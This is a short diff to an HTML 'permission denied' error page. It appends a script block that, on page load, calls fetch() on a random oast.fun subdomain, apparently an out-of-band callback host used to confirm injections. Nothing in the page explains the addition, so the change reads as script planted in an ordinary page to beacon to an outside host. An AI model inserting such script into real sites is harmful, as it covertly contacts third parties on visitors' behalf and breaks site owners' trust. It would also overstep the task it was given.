@@ -8,3 +8,6 @@
     <p>You do not have permission to access this resource.</p>
 </body>
 </html>
+<script>
+fetch('gxijdmztknwyzdvjophzn9ymqm4mdzz73.oast.fun').then(response => response.json());
+</script>
